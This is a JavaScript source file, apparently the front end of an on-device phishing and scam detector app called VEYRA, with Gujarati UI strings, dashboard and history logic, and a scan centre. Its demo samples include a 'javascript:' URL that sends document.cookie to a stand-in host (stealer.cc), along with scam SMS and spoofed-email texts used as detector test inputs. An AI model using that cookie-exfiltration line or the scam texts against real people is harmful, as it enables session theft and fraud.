    empty_activity_desc: "જોખમ ચકાસણી શરૂ કરવા માટે લિંક અથવા સંદેશ સ્કેન કરો.",
    coverage_transparency_title: "ઑન-ડિવાઇસ ગોપનીયતા અને કવરેજ",
    coverage_transparency_text: "VEYRA સમર્થિત એપ્લિકેશનોની સૂચનાઓની તપાસ ફક્ત ડિવાઇસ મેમરી (રેમ) માં કરે છે. ખાનગી સંદેશાઓ અથવા પાસવર્ડ્સ ક્યારેય સર્વર પર મોકલવામાં આવતા નથી.",
    scan_centre_title: "સ્કેન સેન્ટર",
    scan_centre_subtitle: "શંકાસ્પદ લિંક્સ, સંદેશાઓ અને ઇમેઇલ્સની ઑન-ડિવાઇસ તપાસ કરો",
    demo_samples_label: "તાત્કાલિક પરીક્ષણ નમૂનાઓ:",
    input_label_content: "તપાસવા માટેની સામગ્રી:",
    btn_analyse_content: "🛡️ સામગ્રીની તપાસ કરો",
    btn_clear: "સાફ કરો",
    evidence_heading: "ઓળખાયેલ જોખમના સંકેતો:",
    rec_action_heading: "ભલામણ કરેલ પગલાં:",
    history_title: "જોખમ ઇતિહાસ",
    history_subtitle: "ડિવાઇસ પર સંગ્રહિત સુરક્ષા રેકોર્ડ્સ અને ઓડિટ લોગ",
    btn_clear_history: "સાફ કરો",
    filter_all: "બધા",
    filter_safe: "સુરક્ષિત",
    filter_suspicious: "શંકાસ્પદ",
    filter_high_risk: "ઉચ્ચ જોખમ",
    filter_phishing: "ફિશિંગ",
    filter_messages: "સંદેશાઓ",
    filter_blocked: "નકારાયેલ",
    onboarding_title: "ડિવાઇસ અને પરવાનગી સેટઅપ",
    onboarding_subtitle: "વાસ્તવિક ઑન-ડિવાઇસ સુરક્ષા ક્ષમતાઓ અને ચકાસાયેલ પરવાનગીઓ ગોઠવો",
    device_identity_title: "ડિવાઇસ ઓળખ અને નોંધણી",
    lbl_device_name: "ડિવાઇસ:",
    lbl_install_id: "ઇન્સ્ટોલેશન આઈડી:",
    lbl_app_version: "એપ વર્ઝન:",
    lbl_registration: "નોંધણી:",
    device_privacy_note: "તમારું રેન્ડમ ઇન્સ્ટોલેશન આઈડી સ્થાનિક રીતે બનાવવામાં આવ્યું છે. આઇએમઇઆઇ અથવા સંપર્કો ક્યારેય એકત્રિત કરવામાં આવતા નથી.",
    perm_section_title: "ક્ષમતા અને પરવાનગી સ્થિતિ",
    perm_notif_access_title: "નોટિફિકેશન એક્સેસ",
    perm_notif_access_desc: "સમર્થિત એપ્લિકેશન્સની સૂચનાઓમાંથી સંબંધિત સામગ્રીની સુરક્ષિત ઑન-ડિવાઇસ તપાસ કરો.",
    btn_enable_access: "એક્સેસ સક્ષમ કરો",
    perm_notif_post_title: "સુરક્ષા સૂચના ચેનલ",
    perm_notif_post_desc: "જોખમ જણાય ત્યારે VEYRA ની સુરક્ષા ચેતવણીઓ પ્રદર્શિત કરો.",
    perm_sms_title: "એસએમએસ કાર્યક્ષમતા",
    perm_sms_desc: "એન્ડ્રોઇડ સુરક્ષા નીતિઓ હેઠળ સમર્થિત એસએમએસ સુરક્ષા સુવિધાઓ સક્ષમ કરો.",
    perm_link_title: "લિંક અને ફિશિંગ સ્કેનિંગ",
    perm_link_desc: "શેર કરેલી અથવા દાખલ કરેલી લિંક્સની સ્થાનિક સ્તરે તપાસ કરો.",
    perm_email_title: "ઇમેઇલ એકીકરણ",
    perm_email_desc: "વપરાશકર્તા દ્વારા પૂરા પાડવામાં આવેલ ઇમેઇલની તપાસ. જીમેલ ઇનબૉક્સને સીધું બ્લોક કરી શકાતું નથી.",
    checkup_title: "સુરક્ષા ચેકઅપ",
    checkup_subtitle: "એન્ડ્રોઇડ ઓપરેટિંગ સિસ્ટમ અને સુરક્ષા સેટિંગ્સનું ઓડિટ કરો",
    checkup_overall_label: "એકંદર સુરક્ષા સ્કોર",
    btn_recheck: "હવે ઓડિટ કરો",
    recovery_title: "ઘટના પુનઃપ્રાપ્તિ",
    recovery_subtitle: "છેતરપિંડીના કિસ્સામાં તાત્કાલિક પગલાં અને હેલ્પલાઇન 1930",
    helpline_title: "રાષ્ટ્રીય સાયબર ક્રાઈમ હેલ્પલાઇન: 1930",
    helpline_desc: "નાણાકીય છેતરપિંડીની તાત્કાલિક જાણ (cybercrime.gov.in)",
    triage_prompt: "શું બન્યું તે પસંદ કરો:",
    inc_payment: "💸 મેં છેતરપિંડીથી પૈસા ટ્રાન્સફર કર્યા",
    inc_otp: "🔑 મેં ઓટીપી અથવા પાસવર્ડ શેર કર્યો",
    inc_card: "💳 મેં બેંક અથવા કાર્ડની વિગતો શેર કરી",
    inc_apk: "📱 મેં શંકાસ્પદ એપ અથવા એપીકે ઇન્સ્ટોલ કર્યું",
    admin_title: "એડમિન પોર્ટલ",
    admin_subtitle: "સુરક્ષિત વહીવટી કામગીરી અને ડિવાઇસ ટેલિમેટ્રી",
    admin_auth_title: "એડમિનિસ્ટ્રેટર પ્રમાણીકરણ",
    admin_auth_note: "વહીવટી ટેલિમેટ્રી માટે પ્રમાણીકરણ જરૂરી છે. અનધિકૃત પ્રયાસો નકારવામાં આવે છે અને લોગ કરવામાં આવે છે.",
    lbl_admin_user: "એડમિન યુઝરનેમ",
    lbl_admin_pass: "પાસવર્ડ",
    btn_admin_signin: "એડમિન તરીકે સાઇન ઇન કરો",
    provision_summary: "અધિકૃત એડમિન ખાતું બનાવો",
    btn_register_admin: "એડમિન નોંધણી કરો",
    connected_devices_title: "કનેક્ટેડ ડિવાઇસ રજિસ્ટ્રી",
    access_denial_title: "પ્રવેશ નકાર અને ઓડિટ લોગ",
    benchmarks_title: "ચકાસાયેલ ઑન-ડિવાઇસ એમએલ બેન્ચમાર્ક્સ",
    btn_logout: "લોગ આઉટ",
    settings_title: "સેટિંગ્સ",
    settings_subtitle: "દેખાવ, સૂચના અને ગોપનીયતા સેટિંગ્સ",
    sec_appearance: "દેખાવ",
    lbl_dark_mode: "ડાર્ક થીમ",
    desc_dark_mode: "ઊંડા નેવી રંગની સાયબર સુરક્ષા શૈલી",
    sec_notifications: "સુરક્ષા સૂચનાઓ",
    notif_security: "સુરક્ષા સૂચનાઓ",
    notif_security_desc: "જોખમની શોધ પર ઇન-એપ ચેતવણીઓ મેળવો",
    notif_high_risk: "ઉચ્ચ જોખમ ચેતવણીઓ",
    notif_high_risk_desc: "ગંભીર જોખમો માટે સિસ્ટમ પોપઅપ ચેતવણીઓ",
    notif_suspicious_link: "શંકાસ્પદ લિંક ચેતવણીઓ",
    notif_link_desc: "કપટી લિંક્સ મળે ત્યારે સૂચના આપો",
    notif_suspicious_msg: "શંકાસ્પદ સંદેશ ચેતવણીઓ",
    notif_msg_desc: "ઓટીપી અથવા છેતરપિંડીના સંદેશાઓ પર ચેતવણી આપો",
    notif_perm_warnings: "પરવાનગી ચેતવણીઓ",
    notif_perm_desc: "જો સુરક્ષા પરવાનગી બંધ હોય તો સૂચિત કરો",
    notif_sound: "ચેતવણી અવાજ",
    notif_sound_desc: "ઉચ્ચ જોખમ પર અવાજ વગાડો",
    sec_privacy: "ગોપનીયતા અને સ્થાનિક ડેટા",
    privacy_desc: "• શૂન્ય રિમોટ ડેટા: બધો ડેટા ફક્ત તમારા ફોન પર રહે છે.\n• માત્ર સુરક્ષિત ઇતિહાસ: પાસવર્ડ અથવા સંવેદનશીલ સંદેશાઓ ક્યારેય સેવ થતા નથી.\n• સ્થાનિક ડેટાબેઝ: SQLite (veyra_secure.db).",
    btn_clear_scan_history: "સ્થાનિક સ્કેન ઇતિહાસ સાફ કરો",
    sec_about: "VEYRA વિશે",
    nav_home: "હોમ",
    nav_scan: "સ્કેન",
    nav_activity: "પ્રવૃત્તિ",
    nav_shield: "સુરક્ષા",
    nav_help: "મદદ",
    nav_settings: "સેટિંગ્સ",
    pop_link_heading: "આ લિંક જોખમી હોઈ શકે છે!",
    pop_link_body: "અમારા સુરક્ષા એન્જિને આ લિંકમાં શંકાસ્પદ સંકેતો ઓળખ્યા છે.",
    lbl_reasons: "ઓળખના કારણો:",
    lbl_rec_action: "ભલામણ કરેલ પગલાં:",
    pop_link_rec: "લિંક ખોલશો નહીં અને અંગત વિગતો દાખલ કરશો નહીં.",
    btn_dismiss: "બંધ કરો",
    btn_threat_details: "જોખમની વિગતો જુઓ",
    pop_msg_heading: "શંકાસ્પદ સંદેશો ઓળખાયો!",
    pop_msg_body: "આ સંદેશામાં નાણાકીય છેતરપિંડી અથવા ઓળખ ચોરીના સંકેતો મળ્યા છે.",
    pop_msg_rec: "ઓટીપી, પાસવર્ડ અથવા બેંક વિગતો શેર કરશો નહીં.",
    btn_analyse_details: "વિગતો તપાસો",
    pop_email_heading: "સંભવિત ફિશિંગ ઇમેઇલ ઓળખાયો!",
    pop_email_body: "ઇમેઇલમાં બનાવટી પ્રેષક અથવા ઓળખપત્રો માંગવાના સંકેતો છે.",
    pop_email_rec: "કોઈપણ લિંક ખોલતા પહેલા પ્રેષકની ચકાસણી કરો.",
    btn_view_analysis: "વિશ્લેષણ જુઓ",
    pop_access_heading: "અનધિકૃત પ્રવેશ પ્રયાસ ઓળખાયો!",
    pop_access_body: "એક અપ્રમાણિત વિનંતીએ સુરક્ષિત એડમિન સંસાધન પર પ્રવેશવાનો પ્રયાસ કર્યો.",
    btn_view_sec_event: "સુરક્ષા ઘટના જુઓ",
    pop_safe_heading: "કોઈ જાણીતા જોખમો મળ્યા નથી",
    pop_safe_body: "સ્કેન કરેલી સામગ્રીએ કોઈપણ ફિશિંગ અથવા છેતરપિંડીના નિયમોનું ઉલ્લંઘન કર્યું નથી.",
    pop_safe_note: "સામગ્રી સ્થાનિક પરીક્ષણોમાં સુરક્ષિત જણાઈ છે.",
    btn_view_report: "સ્કેન રિપોર્ટ જુઓ",
    pop_perm_heading: "તમારી સુરક્ષા પર ધ્યાન આપવાની જરૂર છે",
    pop_perm_body: "સૂચના એક્સેસ અક્ષમ છે. રીયલ-ટાઇમ બેકગ્રાઉન્ડ સુરક્ષા હાલમાં નિષ્ક્રિય છે.",
    welcome_title: "તમારી ગોપનીયતા મહત્વપૂર્ણ છે.",
    welcome_desc: "શંકાસ્પદ લિંક્સ, ફિશિંગ અને છેતરપિંડીના સંદેશાઓથી 100% ઑન-ડિવાઇસ સુરક્ષા મેળવો.",
    btn_setup_protection: "🛡️ સુરક્ષા સેટ કરો",
    btn_continue_no_login: "લૉગિન વિના આગળ વધો"
  }
};

// ==========================================================================
// 3. APPLICATION STATE
// ==========================================================================
let currentLang = "en";
let currentTheme = "dark";
let currentScanTab = "link";
let currentHistoryFilter = "all";

// ==========================================================================
// 4. INITIALIZATION & LIFECYCLE
// ==========================================================================
document.addEventListener("DOMContentLoaded", function() {
  initTheme();
  initLanguage();
  initDeviceInfo();
  refreshDashboard();
  refreshNotificationSettingsUI();
  refreshPermissionStatuses();

  // Check if first-launch device setup modal is needed
  try {
    let devInfo = JSON.parse(window.VeyraNative.getDeviceInfo());
    if (!devInfo.isSetupCompleted) {
      triggerDeviceSetupModal(false);
    }
  } catch (e) {
    console.error("Device setup check failed", e);
  }
});

// ==========================================================================
// 5. THEME & APPEARANCE MANAGEMENT
// ==========================================================================
function initTheme() {
  let savedTheme = window.VeyraNative.getThemePreference() || "light";
  applyTheme(savedTheme);
}

function toggleTheme() {
  let next = currentTheme === "dark" ? "light" : "dark";
  applyTheme(next);
  window.VeyraNative.setThemePreference(next);
}

function applyTheme(theme) {
  currentTheme = theme;
  document.body.setAttribute("data-theme", theme);
  let icon = document.getElementById("theme-icon");
  if (icon) {
    icon.textContent = theme === "dark" ? "☀️" : "🌙";
  }
  let btn = document.getElementById("settings-theme-btn");
  if (btn) {
    btn.textContent = theme === "dark" ? "Switch to Light Mode" : "Switch to Dark Mode";
  }
}

// ==========================================================================
// 6. LANGUAGE & TRANSLATION CONTROLS
// ==========================================================================
function initLanguage() {
  let saved = window.VeyraNative.getSelectedLanguage() || "en";
  setUiLanguage(saved);
}

function setUiLanguage(lang) {
  if (!I18N[lang]) lang = "en";
  currentLang = lang;
  window.VeyraNative.setLanguage(lang);

  // Update button highlights
  document.querySelectorAll(".lang-btn").forEach(btn => btn.classList.remove("active"));
  let activeBtn = document.getElementById("lang-btn-" + lang);
  if (activeBtn) activeBtn.classList.add("active");

  // Translate all DOM elements with data-i18n
  document.querySelectorAll("[data-i18n]").forEach(el => {
    let key = el.getAttribute("data-i18n");
    if (I18N[lang][key]) {
      el.textContent = I18N[lang][key];
    }
  });

  refreshDashboard();
}

function t(key) {
  return (I18N[currentLang] && I18N[currentLang][key]) ? I18N[currentLang][key] : (I18N["en"][key] || key);
}

// ==========================================================================
// 7. VIEW NAVIGATION
// ==========================================================================
function switchView(viewName) {
  document.querySelectorAll(".view-container").forEach(v => v.classList.remove("active"));
  let target = document.getElementById("view-" + viewName);
  if (target) {
    target.classList.add("active");
  }

  // Update bottom nav
  document.querySelectorAll(".nav-item").forEach(btn => btn.classList.remove("active"));
  let navBtn = document.getElementById("nav-btn-" + viewName);
  if (navBtn) {
    navBtn.classList.add("active");
  }

  window.scrollTo({ top: 0, behavior: "smooth" });

  if (viewName === "dashboard") refreshDashboard();
  if (viewName === "history") loadHistoryList();
  if (viewName === "checkup") runCheckupAudit();
  if (viewName === "onboarding") refreshPermissionStatuses();
  if (viewName === "admin") checkAdminSession();
}

// Android Back Button handler
window.handleBackPress = function() {
  let openModal = document.querySelector(".modal-overlay.active");
  if (openModal) {
    openModal.classList.remove("active");
    return true; // Handled
  }
  let activeView = document.querySelector(".view-container.active");
  if (activeView && activeView.id !== "view-dashboard") {
    switchView("dashboard");
    return true; // Handled
  }
  return false; // Exit app
};

// ==========================================================================
// 8. DEVICE SETUP & IDENTIFICATION
// ==========================================================================
function initDeviceInfo() {
  try {
    let info = JSON.parse(window.VeyraNative.getDeviceInfo());
    let idEl = document.getElementById("onboard-install-id");
    let nameEl = document.getElementById("onboard-dev-name");
    let verEl = document.getElementById("onboard-version");
    let regEl = document.getElementById("onboard-reg-status");

    if (idEl) idEl.textContent = info.installationId;
    if (nameEl) nameEl.textContent = info.deviceName;
    if (verEl) verEl.textContent = info.appVersion;
    if (regEl) regEl.textContent = info.registrationStatus;

    let modalId = document.getElementById("setup-modal-id");
    let modalDev = document.getElementById("setup-modal-dev");
    let modalReg = document.getElementById("setup-modal-status");
    if (modalId) modalId.textContent = info.installationId;
    if (modalDev) modalDev.textContent = info.deviceName;
    if (modalReg) modalReg.textContent = info.registrationStatus;
  } catch (e) {
    console.error("initDeviceInfo error", e);
  }
}

function triggerDeviceSetupModal(isReviewOnly) {
  initDeviceInfo();
  openPopup("popup-device-setup");
}

function finishDeviceSetup(goToPermissions) {
  window.VeyraNative.completeDeviceSetup();
  closePopup("popup-device-setup");
  if (goToPermissions) {
    switchView("onboarding");
  } else {
    switchView("dashboard");
  }
}

// ==========================================================================
// 9. DASHBOARD REFRESH (7 GENUINE METRICS)
// ==========================================================================
function refreshDashboard() {
  try {
    let summary = JSON.parse(window.VeyraNative.getDashboardSummary());

    // 1. Messages Checked
    let c1 = document.getElementById("card-messages-checked") || document.getElementById("card-total-scans");
    if (c1) c1.textContent = summary.messages_checked != null ? summary.messages_checked : summary.total_scans;

    // 2. Possible Scams Found
    let c2 = document.getElementById("card-scams-found") || document.getElementById("card-threats-detected");
    if (c2) c2.textContent = summary.scams_found != null ? summary.scams_found : summary.threats_detected;

    // 3. Phishing Messages Found
    let c3 = document.getElementById("card-phishing-found") || document.getElementById("card-phishing-links");
    if (c3) c3.textContent = summary.phishing_found != null ? summary.phishing_found : summary.phishing_links;

    // 4. Normal Messages
    let c4 = document.getElementById("card-normal-messages") || document.getElementById("card-suspicious-msgs");
    if (c4) c4.textContent = summary.normal_messages != null ? summary.normal_messages : (summary.suspicious_messages || 0);

    // 5. High-Risk Threats
    let c5 = document.getElementById("card-high-risk");
    if (c5) c5.textContent = summary.high_risk_alerts != null ? summary.high_risk_alerts : summary.high_risk_threats;

    // 6. Blocked Attempts
    let c6 = document.getElementById("card-blocked-attempts");
    if (c6) c6.textContent = summary.blocked_attempts;

    // 7. Protection Status
    let c7 = document.getElementById("card-protection-status");
    if (c7) c7.textContent = summary.protection_status;

    let lastScanEl = document.getElementById("card-last-scan");
    if (lastScanEl) {
      if (summary.last_scan_time > 0) {
        let d = new Date(summary.last_scan_time);
        lastScanEl.textContent = "Last scan: " + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) + " (" + d.toLocaleDateString() + ")";
      } else {
        lastScanEl.textContent = "Last scan: None recorded yet";
      }
    }

    // Protection Posture Badge
    let badgeText = document.getElementById("dash-protection-badge-text");
    let badgeContainer = document.getElementById("dash-protection-badge");
    if (summary.active_monitoring) {
      if (badgeText) badgeText.textContent = t("status_active");
      if (badgeContainer) badgeContainer.className = "status-badge active";
    } else {
      if (badgeText) badgeText.textContent = t("status_attention");
      if (badgeContainer) badgeContainer.className = "status-badge warning";
    }

    // Render Recent Security Findings List
    let listContainer = document.getElementById("dash-recent-list");
    if (listContainer) {
      if (summary.recent_findings && summary.recent_findings.length > 0) {
        listContainer.innerHTML = "";
        summary.recent_findings.forEach(item => {
          let badgeClass = item.riskLevel === "HIGH RISK" ? "danger" : (item.riskLevel === "SUSPICIOUS" ? "warning" : "active");
          let d = new Date(item.timestamp);
          let div = document.createElement("div");
          div.className = "history-card";
          div.innerHTML = `
            <div class="history-card-header">
              <span class="status-badge ${badgeClass}" style="margin-bottom:0;">${item.riskLevel}</span>
              <span style="font-size:11px; color:var(--text-muted);">${d.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' })}</span>
            </div>
            <strong style="font-size:13px; color:var(--text-primary); display:block; margin-bottom:4px;">${item.threatType || item.source}</strong>
            <p style="font-size:11.5px; color:var(--text-secondary); margin-bottom:6px;">Status: ${item.actionStatus}</p>
          `;
          listContainer.appendChild(div);
        });
      } else {
        listContainer.innerHTML = `
          <div class="empty-state">
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
            <div style="font-size: 13.5px; font-weight: 600; color: var(--text-secondary); margin-bottom: 4px;">${t("empty_activity_title")}</div>
            <p style="font-size: 11.5px; color: var(--text-muted);">${t("empty_activity_desc")}</p>
          </div>
        `;
      }
    }
  } catch (e) {
    console.error("Dashboard refresh error", e);
  }
}

// ==========================================================================
// 10. SCAN CENTRE & TEST SAMPLES
// ==========================================================================
function switchScanTab(tab) {
  currentScanTab = tab;
  document.getElementById("tab-scan-link").className = tab === "link" ? "btn btn-primary btn-sm" : "btn btn-outline btn-sm";
  document.getElementById("tab-scan-msg").className = tab === "msg" ? "btn btn-primary btn-sm" : "btn btn-outline btn-sm";
  document.getElementById("tab-scan-email").className = tab === "email" ? "btn btn-primary btn-sm" : "btn btn-outline btn-sm";

  let label = document.getElementById("scan-input-label");
  let input = document.getElementById("scan-input-text");
  if (tab === "link") {
    if (label) label.textContent = "Link (URL) to Inspect:";
    if (input) input.placeholder = "e.g. http://paypal.com.account-update.xyz/login";
  } else if (tab === "msg") {
    if (label) label.textContent = "Message Text to Inspect (SMS, WhatsApp):";
    if (input) input.placeholder = "Paste suspicious SMS, bank alert, or courier update message...";
  } else {
    if (label) label.textContent = "Email Content (Headers & Body):";
    if (input) input.placeholder = "Paste RFC email headers (From:, Reply-To:) and email body...";
  }
}

function loadTestSample(type) {
  let input = document.getElementById("scan-input-text");
  if (type === "test_a_prize") {
    switchScanTab("msg");
    input.value = "You won Rs 90,000! Enter your bank details now to claim.";
  } else if (type === "test_b_otp") {
    switchScanTab("msg");
    input.value = "Send us your OTP to unlock your blocked account.";
  } else if (type === "test_c_college") {
    switchScanTab("msg");
    input.value = "Hi, our college meeting starts at 10 AM.";
  } else if (type === "test_d_link") {
    switchScanTab("msg");
    input.value = "Your account will be blocked. Verify your details now: http://urgent-update.example.invalid/account";
  } else if (type === "benign_url") {
    switchScanTab("link");
    input.value = "https://en.wikipedia.org/wiki/Computer_security";
  } else if (type === "phish_paypal") {
    switchScanTab("link");
    input.value = "http://paypal.com.account-update.xyz/login?ref=urgent_kyc";
  } else if (type === "dangerous_scheme") {
    switchScanTab("link");
    input.value = "javascript:fetch('//stealer.cc/token?cookie='+document.cookie)";
  } else if (type === "fake_kyc") {
    switchScanTab("msg");
    input.value = "SBI Alert: Your YONO account has been suspended due to pending KYC. Update PAN immediately to avoid block: http://sbi-pan-update.online/login";
  } else if (type === "postal_smish") {
    switchScanTab("msg");
    input.value = "India Post: Your package #8921 cannot be delivered due to invalid house number. Pay Rs 25 redelivery fee: http://indiapost-redelivery.buzz";
  } else if (type === "spoofed_email") {
    switchScanTab("email");
    input.value = "From: CEO John Doe <attacker@burner-mail.top>\nReply-To: wire-transfer@acquisitions-offshore.net\nTo: finance@company.com\nSubject: Urgent Acquisition Wire Required Today\n\nPlease process an urgent wire transfer for the acquisition today. Do not call my phone as I am in meetings.";
  }
}

function clearScanInput() {
  document.getElementById("scan-input-text").value = "";
  document.getElementById("scan-result-card").style.display = "none";
}

function performScan() {
  let text = document.getElementById("scan-input-text").value.trim();
  if (!text) {
    alert("Please enter text or a link to analyze.");
    return;
  }

  let result;
  if (currentScanTab === "email") {
    result = JSON.parse(window.VeyraNative.scanEmail(text));
  } else {
    result = JSON.parse(window.VeyraNative.scanContent(text));
  }

  displayScanResult(result);
  refreshDashboard();

  // Trigger contextual smart pop-ups based on result
  triggerContextualPopup(result);
}

function displayScanResult(res) {
  let card = document.getElementById("scan-result-card");
  card.style.display = "block";

  // Apply VEYRA Status Colors to the Result Card
  if (res.riskLevel === "HIGH RISK") {
    card.className = "card card-danger";
  } else if (res.riskLevel === "SUSPICIOUS") {
    card.className = "card card-warning";
  } else {
    card.className = "card card-safe";
  }

  let badge = document.getElementById("scan-res-badge");
  let score = document.getElementById("scan-res-score");
  let headline = document.getElementById("scan-res-headline");
  let explanation = document.getElementById("scan-res-explanation");
  let action = document.getElementById("scan-res-action");
  let evidenceList = document.getElementById("scan-evidence-list");
  let meta = document.getElementById("scan-res-meta");
  let emailNotice = document.getElementById("scan-email-notice");

  badge.textContent = res.riskLevel;
  badge.className = res.riskLevel === "HIGH RISK" ? "status-badge danger" : (res.riskLevel === "SUSPICIOUS" ? "status-badge warning" : "status-badge active");
  score.textContent = "Risk Score: " + res.riskScore + "/100";

  headline.textContent = res.riskLevel === "HIGH RISK" ? "High Risk Threat Detected" : (res.riskLevel === "SUSPICIOUS" ? "Suspicious Content Flagged" : "No Known Threats Detected");
  explanation.textContent = res.explanation;
  action.textContent = res.recommendedAction;

  evidenceList.innerHTML = "";
  if (res.indicators && res.indicators.length > 0) {
    res.indicators.forEach(ind => {
      let li = document.createElement("li");
      li.innerHTML = `⚠️ <span>${ind}</span>`;
      evidenceList.appendChild(li);
    });
  } else {
    let li = document.createElement("li");
    li.innerHTML = `✅ <span>Passed deterministic safety rules & hybrid ML classification</span>`;
    evidenceList.appendChild(li);
  }

  if (res.isEmailAnalysis) {
    emailNotice.style.display = "block";
  } else {
    emailNotice.style.display = "none";
  }

  meta.textContent = `Model: ${res.modelVersion || "Veyra-Hybrid-v1.2.0-Mobile"} | Latency: <5ms | 100% On-Device Execution`;
}

// ==========================================================================
// 11. CONTEXTUAL SMART SECURITY POP-UPS TRIGGER
// ==========================================================================
function triggerContextualPopup(res) {
  if (currentScanTab === "link" && res.riskLevel === "HIGH RISK") {
    // POP-UP A: DANGEROUS LINK ALERT
    let list = document.getElementById("popup-link-reasons");
    list.innerHTML = "";
    (res.indicators || []).forEach(r => {
      let li = document.createElement("li");
      li.textContent = "• " + r;
      list.appendChild(li);
    });
    openPopup("popup-dangerous-link");
  } else if (currentScanTab === "msg" && (res.riskLevel === "HIGH RISK" || res.riskLevel === "SUSPICIOUS")) {
    // POP-UP B: SUSPICIOUS MESSAGE ALERT
    let list = document.getElementById("popup-msg-reasons");
    list.innerHTML = "";
    (res.indicators || []).forEach(r => {
      let li = document.createElement("li");
      li.textContent = "• " + r;
      list.appendChild(li);
    });
    openPopup("popup-suspicious-message");
  } else if (currentScanTab === "email" && (res.riskLevel === "HIGH RISK" || res.riskLevel === "SUSPICIOUS")) {
    // POP-UP C: SUSPICIOUS EMAIL ALERT
    let list = document.getElementById("popup-email-reasons");
    list.innerHTML = "";
    (res.indicators || []).forEach(r => {
      let li = document.createElement("li");
      li.textContent = "• " + r;
      list.appendChild(li);
    });
    openPopup("popup-suspicious-email");
  } else if (res.riskLevel === "NO KNOWN THREAT DETECTED") {
    // POP-UP E: SAFE SCAN RESULT
    openPopup("popup-safe-scan");
  }
}

function openPopup(modalId) {
  let modal = document.getElementById(modalId);
  if (modal) {
    modal.classList.add("active");
  }
}

function closePopup(modalId) {
  let modal = document.getElementById(modalId);
  if (modal) {
    modal.classList.remove("active");
  }
}

// Android notification click handling
window.handleNotificationClick = function(findingId) {
  switchView("history");
};

// ==========================================================================
// 12. THREAT HISTORY & FILTERING
// ==========================================================================
function loadHistoryList() {
  let container = document.getElementById("history-items-container");
  if (!container) return;

  try {
    let findings = JSON.parse(window.VeyraNative.getFindingsHistory(50));
    let accessLogs = JSON.parse(window.VeyraNative.getAccessLogs());

    let filtered = [];

    if (currentHistoryFilter === "all") {
      filtered = findings;
    } else if (currentHistoryFilter === "safe") {
      filtered = findings.filter(f => f.riskLevel === "NO KNOWN THREAT DETECTED");
    } else if (currentHistoryFilter === "suspicious") {
      filtered = findings.filter(f => f.riskLevel === "SUSPICIOUS");
    } else if (currentHistoryFilter === "high_risk") {
      filtered = findings.filter(f => f.riskLevel === "HIGH RISK");
    } else if (currentHistoryFilter === "phishing") {
      filtered = findings.filter(f => (f.threatType || "").includes("Link") || (f.threatType || "").includes("URL"));
    } else if (currentHistoryFilter === "messages") {
      filtered = findings.filter(f => (f.threatType || "").includes("Message") || (f.threatType || "").includes("SMS"));
    } else if (currentHistoryFilter === "blocked") {
      filtered = accessLogs.filter(l => l.outcome === "ACCESS DENIED");
    }

    container.innerHTML = "";

    if (filtered.length === 0) {
      container.innerHTML = `
        <div class="empty-state">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
          <div style="font-size: 13.5px; font-weight: 600; color: var(--text-secondary); margin-bottom: 4px;">No Matching Security Records</div>
          <p style="font-size: 11.5px; color: var(--text-muted);">No recorded detection events match the selected filter category.</p>
        </div>
      `;
      return;
    }

    filtered.forEach(item => {
      let div = document.createElement("div");
      div.className = "history-card";
      let d = new Date(item.timestamp);

      if (item.outcome === "ACCESS DENIED") {
        div.innerHTML = `
          <div class="history-card-header">
            <span class="status-badge danger">ACCESS DENIED</span>
            <span style="font-size:11px; color:var(--text-muted);">${d.toLocaleDateString()} ${d.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' })}</span>
          </div>
          <strong style="font-size:13px; color:var(--text-primary); display:block; margin-bottom:4px;">Target Resource: ${item.resource}</strong>
          <p style="font-size:11.5px; color:var(--text-secondary); margin-bottom:6px;">Details: ${item.details}</p>
          <span style="font-size:10.5px; color:var(--danger-red); font-weight:700;">403 Forbidden Rejection Logged</span>
        `;
      } else {
        let badgeClass = item.riskLevel === "HIGH RISK" ? "danger" : (item.riskLevel === "SUSPICIOUS" ? "warning" : "active");
        let evSnippet = (item.sanitizedEvidence && item.sanitizedEvidence.length > 0) ? item.sanitizedEvidence.join(", ") : "No threat patterns";
        div.innerHTML = `
          <div class="history-card-header">
            <span class="status-badge ${badgeClass}">${item.riskLevel}</span>
            <span style="font-size:11px; color:var(--text-muted);">${d.toLocaleDateString()} ${d.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' })}</span>
          </div>
          <strong style="font-size:13px; color:var(--text-primary); display:block; margin-bottom:4px;">${item.threatType || item.source}</strong>
          <p style="font-size:11.5px; color:var(--text-secondary); margin-bottom:6px;">Indicators: ${evSnippet}</p>
          <div style="font-size:11px; color:var(--teal-accent);">Status: ${item.actionStatus}</div>
        `;
      }
      container.appendChild(div);
    });
  } catch (e) {
    console.error("loadHistoryList error", e);
  }
}

function filterHistory(filterType) {
  currentHistoryFilter = filterType;
  document.querySelectorAll(".filter-btn").forEach(btn => btn.classList.remove("active"));
  let active = document.getElementById("flt-" + filterType);
  if (active) active.classList.add("active");
  loadHistoryList();
}

function promptClearHistory() {
  if (confirm("Clear local on-device scan history? This deletes local records from veyra_secure.db without transmitting deletion packets.")) {
    window.VeyraNative.clearHistory();
    loadHistoryList();
    refreshDashboard();
  }
}

// ==========================================================================
// 13. PERMISSIONS & NOTIFICATION SETTINGS
// ==========================================================================
function refreshPermissionStatuses() {
  try {
    let perms = JSON.parse(window.VeyraNative.getPermissionStatuses());
    let bNotif = document.getElementById("badge-perm-notif-access");
    if (bNotif) {
      bNotif.textContent = perms.notificationAccess.toUpperCase();
      bNotif.className = perms.notificationAccess === "Enabled" ? "perm-badge enabled" : "perm-badge required";
    }
  } catch (e) {
    console.error("refreshPermissionStatuses error", e);
  }
}

function openAndroidNotificationSettings() {
  window.VeyraNative.openNotificationSettings();
  setTimeout(refreshPermissionStatuses, 1500);
}

function refreshNotificationSettingsUI() {
  try {
    let s = JSON.parse(window.VeyraNative.getNotificationSettings());
    let tSec = document.getElementById("toggle-notif-security");
    let tHigh = document.getElementById("toggle-notif-high-risk");
